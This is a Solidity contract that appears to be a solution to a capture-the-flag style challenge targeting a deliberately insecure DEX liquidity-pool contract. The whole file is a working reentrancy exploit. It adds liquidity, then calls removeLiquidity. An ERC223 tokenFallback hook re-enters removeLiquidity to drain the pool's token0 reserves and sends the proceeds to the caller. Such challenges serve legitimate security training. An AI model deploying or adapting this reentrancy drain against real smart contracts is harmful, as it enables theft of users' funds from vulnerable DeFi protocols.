// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../Challenge2.DEX.sol";

contract HackChallenge2 {
    InsecureDexLP dex;
    IERC20 token0;
    IERC20 token1;
    bool inHack;

    constructor(address instance) {
        dex = InsecureDexLP(instance);

        token0 = IERC20(dex.token0());
        token1 = IERC20(dex.token1());

        token0.approve(instance, type(uint256).max);
        token1.approve(instance, type(uint256).max);
    }

    // Execute a reentrancy attack using the ERC223 callback
    function hack() external {
        token0.transferFrom(msg.sender, address(this), token0.balanceOf(msg.sender));
        token1.transferFrom(msg.sender, address(this), token1.balanceOf(msg.sender));

        inHack = true;

        dex.addLiquidity(
            token0.balanceOf(address(this)),
            token1.balanceOf(address(this))
        );

        dex.removeLiquidity(dex.balanceOf(address(this)));

        inHack = false;

        token0.transfer(msg.sender, token0.balanceOf(address(this)));
        token1.transfer(msg.sender, token1.balanceOf(address(this)));
    }

    function tokenFallback(address, uint256, bytes calldata) external {
        if (!inHack) {
            return;
        }

        uint256 amount = token0.balanceOf(address(dex));
        if (amount > 0) {
            dex.removeLiquidity(dex.balanceOf(address(this)));
        }
    }
}
